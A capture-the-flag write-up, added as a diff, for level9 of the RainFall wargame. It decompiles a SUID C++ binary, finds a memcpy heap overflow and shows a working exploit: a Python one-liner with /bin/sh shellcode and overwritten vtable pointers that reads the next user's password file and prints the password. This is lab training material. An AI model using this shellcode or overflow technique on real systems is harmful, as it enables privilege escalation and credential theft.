@@ -1,0 +1,134 @@
+When we change to level9 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
+```
+
+We find another SUID executable, this time owned by bonus0.
+
+```shell
+level9@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
+```
+
+When executing, it doesn't take any input and doesn't seem to do anything.
+
+```shell
+level9@RainFall:~$ ./level9
+level9@RainFall:~$
+```
+
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level9@192.168.184.128:/home/user/level9/level9 .
+          _____       _       ______    _ _
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.184.128:4242
+level9@192.168.184.128's password:
+level9                                                                                                                                100% 5366   892.7KB/s   00:00
+```
+
+The decompiled code looks like this
+
+```cpp
+void N::N(int)(int32_t arg_8h, int32_t arg_ch)
+{
+    // N::N(int)
+    *(code **)arg_8h = vtable.N.0;
+    *(int32_t *)(arg_8h + 0x68) = arg_ch;
+    return;
+}
+
+int32_t N::operator-(N&)(int32_t arg_8h, int32_t arg_ch)
+{
+    // N::operator-(N&)
+    return *(int32_t *)(arg_8h + 0x68) - *(int32_t *)(arg_ch + 0x68);
+}
+
+int32_t fcn.0804873a(int32_t arg_8h, int32_t arg_ch)
+{
+    // N::operator+(N&)
+    return *(int32_t *)(arg_ch + 0x68) + *(int32_t *)(arg_8h + 0x68);
+}
+
+void N::setAnnotation(char*)(void *s1, char *s)
+{
+    undefined4 uVar1;
+
+    // N::setAnnotation(char*)
+    uVar1 = strlen(s);
+    memcpy((int32_t)s1 + 4, s, uVar1);
+    return;
+}
+
+void main(char **argv, char **envp)
+{
+    void *s1;
+    undefined4 *arg_8h;
+    int32_t var_bp_4h;
+
+    if ((int32_t)argv < 2) {
+        _exit(1);
+    }
+    s1 = (void *)operator new(unsigned int)(0x6c);
+    N::N(int)((int32_t)s1, 5);
+    arg_8h = (undefined4 *)operator new(unsigned int)(0x6c);
+    N::N(int)((int32_t)arg_8h, 6);
+    N::setAnnotation(char*)(s1, envp[1]);
+    (**(code **)*arg_8h)(arg_8h, s1);
+    return;
+}
+```
+
+Inside ``setAnnotation`` the function ``memcpy`` is being called, which is vulnerable to buffer overflows. As there is no function spawning a shell for us we need to provide the code for our shell, which we can find online. [[1]](https://www.exploit-db.com/exploits/42428) However, first we need to figure the address of the buffer out. 
+
+```shell
+(gdb) disas main
+Dump of assembler code for function main:
+   [...]
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:	mov    0x10(%esp),%eax
+   0x08048680 <+140>:	mov    (%eax),%eax
+   0x08048682 <+142>:	mov    (%eax),%edx
+   0x08048684 <+144>:	mov    0x14(%esp),%eax
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:	leave
+   0x08048699 <+165>:	ret
+End of assembler dump.
+(gdb) b *0x0804867c
+Breakpoint 1 at 0x804867c
+(gdb) r AAAAAAAAAA
+Starting program: /home/user/level9/level9 AAAAAAAAAA
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:	0x41414141
+```
+
+With this address we can construct our payload: 
+
+- pointer to the shellcode
+- shellcode
+- random characters to fill buffer
+- pointer to the beginning of the buffer
+
+```shell
+level9@RainFall:~$ ./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*80 + "\x0c\xa0\x04\x08")')
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
